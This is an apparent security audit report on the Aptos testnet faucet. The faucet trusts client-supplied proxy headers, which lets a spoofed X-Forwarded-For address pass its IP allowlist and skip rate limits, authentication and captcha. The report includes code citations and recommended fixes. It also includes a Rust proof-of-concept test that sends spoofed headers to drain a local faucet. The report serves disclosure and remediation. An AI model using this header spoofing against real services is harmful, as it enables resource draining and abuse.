# Audit Report

## Title
IP Spoofing via Untrusted HTTP Headers Allows Complete Bypass of Faucet Security Controls

## Summary
The Aptos Faucet service trusts client-supplied HTTP headers (`X-Forwarded-For`, `X-Real-IP`, `X-Forwarded-IP`) to determine the source IP address for security checks. An attacker can spoof these headers to bypass IP allowlist restrictions, enabling complete circumvention of all rate limits, authentication checks, captcha verification, and other security controls.

## Finding Description

The faucet service uses the `poem::web::RealIp` extractor to determine the source IP address of incoming requests. This extractor unconditionally trusts proxy headers like `X-Forwarded-For`, `X-Real-IP`, and `X-Forwarded-IP` without validating that the request actually originated from a trusted proxy. [1](#0-0) [2](#0-1) 

When a request is processed, the extracted IP address is used to create `CheckerData`: [3](#0-2) 

The faucet then checks if this IP should bypass all security controls via the IP allowlist bypasser: [4](#0-3) 

The IP allowlist bypasser simply checks if the source IP matches any configured IP range: [5](#0-4) 

**Attack Path:**
1. Attacker identifies or guesses an IP address in the allowlist (e.g., internal network ranges like `10.0.0.0/8`, `172.16.0.0/12`)
2. Attacker sends a request to the faucet with a spoofed header: `X-Forwarded-For: 10.0.0.1`
3. The `RealIp` extractor extracts `10.0.0.1` as the source IP
4. The IP allowlist bypasser sees the IP matches the allowlist
5. The request completely bypasses all security checks:
   - No authentication token required
   - No rate limiting enforced
   - No captcha verification
   - No storage writes to track the request
   - No IP blocklist checks
6. Attacker can drain the faucet by making unlimited requests

This breaks the security guarantee that only requests from trusted IP addresses should bypass security controls.

## Impact Explanation

This is a **HIGH severity** vulnerability for the faucet service specifically, though it does not affect core blockchain consensus or state:

**What can be exploited:**
- Complete bypass of rate limiting (both memory-based and Redis-based checkers)
- Bypass of authentication token requirements
- Bypass of captcha verification
- Bypass of all custom security checkers
- No audit trail in storage systems

**Potential damage:**
- Unlimited test token distribution leading to faucet fund exhaustion
- Denial of service for legitimate testnet users
- Circumvention of abuse prevention mechanisms
- Loss of accountability for faucet usage

**Scope limitations:**
- Only affects testnet faucet service, not mainnet operations
- Does not impact blockchain consensus, Move VM, or state management
- Test tokens have no real economic value
- Does not affect validator operations or on-chain security

However, this is classified as HIGH per the original security question because:
1. It enables complete security control bypass
2. The attack requires no special privileges
3. The exploitation is trivial (single HTTP header)
4. It can cause service degradation and resource exhaustion

## Likelihood Explanation

**Likelihood: MEDIUM to HIGH** depending on deployment configuration.

**Factors increasing likelihood:**
- The vulnerability exists in production code without any mitigation
- No validation of request origin is performed
- IP allowlists are commonly configured for internal/trusted networks
- Common IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) are predictable
- Attack requires only basic HTTP knowledge

**Factors decreasing likelihood:**
- If deployed behind a trusted load balancer (ALB/GCE) with proper network policies, direct pod access may be blocked
- In Kubernetes deployments, services may not expose pods directly [6](#0-5) 

However, the application code itself provides **zero protection** and relies entirely on infrastructure configuration. Any misconfiguration, debugging access (kubectl port-forward), or direct pod exposure makes this immediately exploitable.

## Recommendation

**Immediate Fix:** Validate that requests originate from trusted proxies before trusting proxy headers.

**Option 1: Use remote IP only when not behind proxy**
```rust
// In fund.rs, modify IP extraction to only use remote socket address
let source_ip = request.remote_addr()
    .and_then(|addr| addr.as_socket_addr())
    .map(|socket| socket.ip())
    .ok_or_else(|| ...)?;
```

**Option 2: Implement trusted proxy validation**
Configure a list of trusted proxy IPs and only trust forwarding headers when the direct connection comes from a trusted proxy:

```rust
// Add to ServerConfig
pub trusted_proxies: Vec<IpAddr>,

// In preprocess_request
let direct_ip = request.remote_addr()?.as_socket_addr()?.ip();
let source_ip = if trusted_proxies.contains(&direct_ip) {
    // Only trust proxy headers from known proxies
    RealIp::from_request(&request, &mut RequestBody::default())
        .await?.0.ok_or(...)?
} else {
    // Use direct connection IP
    direct_ip
};
```

**Option 3: Network-level isolation**
Ensure the faucet service is never directly accessible without passing through the load balancer:
- Implement strict Kubernetes NetworkPolicies
- Use private IPs for pod endpoints
- Configure security groups to only allow load balancer traffic

**Best Practice:** Combine Options 2 and 3 for defense in depth.

## Proof of Concept

```rust
#[tokio::test]
async fn test_ip_spoofing_bypass() -> Result<()> {
    // Setup: Create IP allowlist with a known IP
    let allowlist_ips = vec!["10.0.0.1"];
    make_ip_allowlist(&allowlist_ips)?;
    
    // Start faucet server with IP allowlist bypasser
    let config_content = r#"
server_config:
  api_path_base: ""
bypasser_configs:
  - type: "IpAllowlist"
    file: "/tmp/ip_allowlist.txt"
checker_configs:
  - type: "MemoryRatelimit"
    max_requests_per_day: 1
funder_config:
  type: "FakeFunder"
handler_config:
  use_helpful_errors: true
  return_rejections_early: false
"#;
    let (port, _handle) = start_server(config_content).await?;
    
    // Attacker from IP 8.8.8.8 should be rate limited after 1 request
    let client = reqwest::Client::new();
    
    // First request succeeds
    let response = client
        .post(format!("http://127.0.0.1:{}/fund", port))
        .json(&FundRequest {
            address: Some(AccountAddress::random().to_string()),
            amount: Some(1000),
            ..Default::default()
        })
        .send()
        .await?;
    assert_eq!(response.status(), StatusCode::OK);
    
    // Second request should fail due to rate limit
    let response = client
        .post(format!("http://127.0.0.1:{}/fund", port))
        .json(&FundRequest {
            address: Some(AccountAddress::random().to_string()),
            amount: Some(1000),
            ..Default::default()
        })
        .send()
        .await?;
    assert_eq!(response.status(), StatusCode::TOO_MANY_REQUESTS);
    
    // EXPLOIT: Add X-Forwarded-For header with allowlisted IP
    let response = client
        .post(format!("http://127.0.0.1:{}/fund", port))
        .header("X-Forwarded-For", "10.0.0.1")  // Spoofed IP
        .json(&FundRequest {
            address: Some(AccountAddress::random().to_string()),
            amount: Some(1000),
            ..Default::default()
        })
        .send()
        .await?;
    
    // Request succeeds despite rate limit - security bypass!
    assert_eq!(response.status(), StatusCode::OK);
    
    // Can continue making unlimited requests by spoofing the IP
    for _ in 0..10 {
        let response = client
            .post(format!("http://127.0.0.1:{}/fund", port))
            .header("X-Forwarded-For", "10.0.0.1")
            .json(&FundRequest {
                address: Some(AccountAddress::random().to_string()),
                amount: Some(1000),
                ..Default::default()
            })
            .send()
            .await?;
        assert_eq!(response.status(), StatusCode::OK);
    }
    
    Ok(())
}
```

## Notes

While this vulnerability allows complete bypass of faucet security controls, it is important to note that:

1. **Scope is limited to the faucet service** - This does not affect core blockchain consensus, Move VM execution, state management, or on-chain operations.

2. **Testnet-only impact** - The faucet is used for distributing test tokens on testnets, not mainnet assets.

3. **Infrastructure-dependent** - Proper network isolation and load balancer configuration can mitigate the attack surface, but the application code itself provides no protection.

4. **Defense-in-depth failure** - Security should not rely solely on infrastructure configuration. The application should validate request origins.

The vulnerability is valid and exploitable, but its impact is confined to auxiliary testnet services rather than critical blockchain security invariants.

### Citations

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L106-108)
```rust
        // This automagically uses FromRequest to get this data from the request.
        // It takes into things like X-Forwarded-IP and X-Real-IP.
        source_ip: RealIp,
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L217-225)
```rust
        let source_ip = match source_ip.0 {
            Some(ip) => ip,
            None => {
                return Err(AptosTapError::new(
                    "No source IP found in the request".to_string(),
                    AptosTapErrorCode::SourceIpMissing,
                ))
            },
        };
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L237-242)
```rust
        let checker_data = CheckerData {
            receiver,
            source_ip,
            headers: Arc::new(header_map.clone()),
            time_request_received_secs: get_current_time_secs(),
        };
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L244-259)
```rust
        // See if this request meets the criteria to bypass checkers / storage.
        for bypasser in &self.bypassers {
            if bypasser
                .request_can_bypass(checker_data.clone())
                .await
                .map_err(|e| {
                    AptosTapError::new_with_error_code(e, AptosTapErrorCode::BypasserError)
                })?
            {
                info!(
                    "Allowing request from {} to bypass checks / storage",
                    source_ip
                );
                return Ok((checker_data, true, permit));
            }
        }
```

**File:** crates/aptos-faucet/core/src/bypasser/ip_allowlist.rs (L24-29)
```rust
#[async_trait]
impl BypasserTrait for IpAllowlistBypasser {
    async fn request_can_bypass(&self, data: CheckerData) -> Result<bool> {
        Ok(self.manager.contains_ip(&data.source_ip))
    }
}
```

**File:** terraform/helm/testnet-addons/templates/ingress.yaml (L11-31)
```yaml
    # EKS annotations
    {{- if eq .Values.cloud "EKS" }}
    kubernetes.io/ingress.class: alb
    alb.ingress.kubernetes.io/scheme: internet-facing
    alb.ingress.kubernetes.io/tags: {{ .Values.service.aws_tags | quote }}
    {{- if .Values.ingress.loadBalancerSourceRanges }}
    alb.ingress.kubernetes.io/inbound-cidrs: {{ join "," .Values.ingress.loadBalancerSourceRanges }}
    {{- end }}
    {{- if .Values.ingress.acm_certificate }}
    alb.ingress.kubernetes.io/certificate-arn: {{ .Values.ingress.acm_certificate }}
    alb.ingress.kubernetes.io/listen-ports: '[{"HTTP": 80}, {"HTTPS": 443}]'
    # ensure ALB ingress controller is version > 1.4.4
    alb.ingress.kubernetes.io/ssl-redirect: '443'
    {{- end }}
    {{- if .Values.ingress.wafAclArn }}
    alb.ingress.kubernetes.io/wafv2-acl-arn: {{ .Values.ingress.wafAclArn }}
    {{- end }}
    {{- if .Values.ingress.enableStickyness }}
    alb.ingress.kubernetes.io/target-group-attributes: stickiness.enabled=true,stickiness.lb_cookie.duration_seconds={{ .Values.ingress.cookieDurationSeconds }}
    alb.ingress.kubernetes.io/target-type: ip
    {{- end }}
```
